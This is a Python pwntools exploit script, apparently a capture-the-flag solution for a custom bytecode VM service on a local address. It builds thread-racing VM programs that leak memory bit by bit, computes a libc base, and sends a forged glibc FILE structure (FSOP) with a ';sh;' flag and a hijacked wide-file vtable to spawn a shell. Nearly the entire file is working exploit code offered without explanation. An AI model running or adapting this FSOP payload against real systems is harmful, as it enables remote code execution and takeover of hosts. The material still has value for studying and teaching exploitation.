from pwn import *

f = open("exp.txt","w")

code_1 = '''
thread 1
alloc r0, 0x200000
mov r1, 0x6f57206f6c6c6548
mov r2, 0xa646c72
write r0, r1, 0x0
write r0, r2, 0x8
print r0, 0, 0xc
pause

alloc r1, 0xffffffff
mov r2, 0x6161616161616161
write r1, r2, 0x0
mov r6, 0x0
mov r3, 0x1
unlock 0x1
alloc r7, 0x200000
'''

for i in range(0, 64):
    code_1 += f'mov2 r2, r7\n'
    code_1 += f'and r2, {hex(1 << i)}\n'
    code_1 += f'shr r2, {hex(i)}\n'
    code_1 += f'mul r2, 0x800000\n'
    code_1 += f'sqr r2, 0x12345\n'
    code_1 += f'write r1, r3, 0x10\n'

    code_1 += f'mov r2, 0x1\n'
    code_1 += f'mul r2, 0x800000\n'
    code_1 += f'sqr r2, 0x12345\n'

    code_1 += f'read r1, r4, 0x10\n'
    code_1 += f'shl r4, {hex(i)}\n'
    code_1 += f'and r6, {hex(~(1 << i))}\n'
    code_1 += f'or2 r6, r4\n'

    code_1 += f'unlock 0x1\n'

code_1 += f'print r0, 0, 0xc\n'
code_1 += f'write r1, r6, 0x0\n'
code_1 += f'print r1, 0, 0x8\n'

code_1 += '''
mov r6, 0x0
mov r3, 0x1
unlock 0x1
alloc r7, 0x200000
'''

for i in range(0, 64):
    code_1 += f'mov2 r2, r7\n'
    code_1 += f'and r2, {hex(1 << i)}\n'
    code_1 += f'shr r2, {hex(i)}\n'
    code_1 += f'mul r2, 0x800000\n'
    code_1 += f'sqr r2, 0x12345\n'
    code_1 += f'write r1, r3, 0x10\n'

    code_1 += f'mov r2, 0x1\n'
    code_1 += f'mul r2, 0x800000\n'
    code_1 += f'sqr r2, 0x12345\n'

    code_1 += f'read r1, r4, 0x10\n'
    code_1 += f'shl r4, {hex(i)}\n'
    code_1 += f'and r6, {hex(~(1 << i))}\n'
    code_1 += f'or2 r6, r4\n'

    code_1 += f'unlock 0x1\n'

code_1 += f'print r0, 0, 0xc\n'
code_1 += f'write r1, r6, 0x0\n'
code_1 += f'print r1, 0, 0x8\n'

code_1 += '''
copy r7, r7, 0x1821ac9
pause
pause
pause
'''


code_2 = '''
thread 2
alloc r1, 0xffffffff
mov r2, 0x6262626262626262
write r1, r2, 0x0
mov r3, 0x0
lock
'''

for i in range(0, 64):
    code_2 += f'mov r2, 0x1\n'
    code_2 += f'mul r2, 0x400000\n'
    code_2 += f'sqr r2, 0x12345\n'
    code_2 += f'copy r1, r1, 0xfffffffefffff010\n'
    code_2 += f'lock\n'

code_2 += '''
mov r3, 0x0
lock
'''

for i in range(0, 64):
    code_2 += f'mov r2, 0x1\n'
    code_2 += f'mul r2, 0x400000\n'
    code_2 += f'sqr r2, 0x12345\n'
    code_2 += f'copy r1, r1, 0xfffffffefffff010\n'
    code_2 += f'lock\n'

f.write(code_1+code_2)
f.close()

#code = code_1+code_2

code = '''
thread 1
alloc r0, 0x1000
mov r1, 0x6f57206f6c6c6548
mov r2, 0xa646c72
write r0, r1, 0x0
write r0, r2, 0x8
print r0, 0, 0xc
copy r0, r0, 0xc
'''

for i in range(0,0x30):
    try:
        print(i)
        #p = process(["./myP1G","stdout"])
        p = remote("172.17.0.3", 9999)

        time.sleep(0.5)
        p.sendline(code); time.sleep(0.5)

        p.interactive()

        p.send(b'\n')

        libc_base = u64(p.recvuntil(b'\x7f', timeout=3)[-6:].ljust(8,b'\x00')) + 0x1406ff0
        print(f'libc_base = {hex(libc_base)}')

        oob_addr = u64(p.recvuntil(b'\x7f', timeout=3)[-6:].ljust(8,b'\x00'))
        print(f'oob_addr = {hex(oob_addr)}')

        libc_rw = libc_base + 0x219000
        if(libc_rw&0xf000 == 0x0000):
            break
        else:
            p.close()
    except:
        pass

libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
def FSOP_struct(flags = 0, _IO_read_ptr = libc_base+0x219aa0-0x10, _IO_read_end = 0, _IO_read_base = 0,\
_IO_write_base = 0, _IO_write_ptr = libc_base+0x219aa0-0x10, _IO_write_end = 0, _IO_buf_base = 0, _IO_buf_end = 0,\
_IO_save_base = 0, _IO_backup_base = 0, _IO_save_end = 0, _markers= 0, _chain = 0, _fileno = 0,\
_flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0, _shortbuf = 0, lock = 0,\
_offset = 0, _codecvt = 0, _wide_data = 0, _freeres_list = 0, _freeres_buf = 0,\
__pad5 = 0, _mode = 0, _unused2 = b"", vtable = 0, more_append = b""):
    
    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00"*0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")
    
    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

_IO_file_jumps = libc_base + libc.symbols['_IO_file_jumps']
fsop_addr = libc_base + 0x219aa0

FSOP = FSOP_struct(flags = u64(b"\x01\x01;sh;\x00\x00"), \
        lock            = fsop_addr + 0x10, \
        _wide_data      = fsop_addr + 0x100, \
        _markers        = 0x0, \
        _mode           = 0xffffffff, \
        vtable          = libc_base + libc.symbols['_IO_wfile_jumps'] - 0x10, \
        __pad5          = fsop_addr - 0x8
        )


raw_input()
pay = b'\x00'*0xa7d
pay += p64(0x00000000fbad288b)
pay += p64(libc_base+0x219b23)
pay += p64(0x0)
pay += p64(libc_base+0x219aa0)*4
pay += p64(libc_base+0x219aa0)
pay += p64(libc_base+0x219aa0+0x200)
pay += b'\x00'*0x28
pay += p32(0x0) + p32(0x0)
pay += p64(0xffffffffffffffff)
pay += p32(0x0)
pay += FSOP.ljust(0x100, b'\x00')
pay += p64(0x0)
pay += p64(libc_base + 0xebc88)
pay += p64(0x0) * 26
pay += p64(fsop_addr+0x100-0x68+0x8) 
pay += p64(0x0) 
pay += p64(0x0) 
pay += p64(0x0) 
p.send(pay)

p.interactive()